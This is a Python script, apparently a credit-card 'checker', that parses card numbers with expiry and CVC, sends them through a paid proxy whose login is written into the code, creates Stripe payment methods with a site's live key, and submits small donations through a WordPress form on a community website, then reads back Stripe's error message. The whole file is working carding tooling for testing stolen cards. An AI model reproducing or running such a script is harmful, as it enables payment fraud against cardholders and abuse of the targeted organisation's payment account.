import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "ol-pro.porterproxies.com:7777:customer-PP_K3LIW0QTTL-cc-US:imv41dtg"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5cceeecc6c%3B+stripe-js-v3%2F5cceeecc6c%3B+card-element&key=pk_live_51P8IPZH1vCzvxZYyDn4BNA1FmPomApUnZyHzE0sM8lo1W85oMSZOUBUhy8wL4VxYob9tY1g7bdInCsnOTztCGtnd00KH92QIUK'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'community.interestofjustice.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://community.interestofjustice.org',
	    'referer': 'https://community.interestofjustice.org/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1747981628337',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=27&_fluentform_2_fluentformnonce=7a0634d5c7&_wp_http_referer=%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&country-list=&payment_input_2=Free&payment_input=4&payment_input_custom_4=0.5&payment_method=stripe&email_1=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '2',
	}
	
	response = session.post(
	    'https://community.interestofjustice.org/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
	
	return (result)
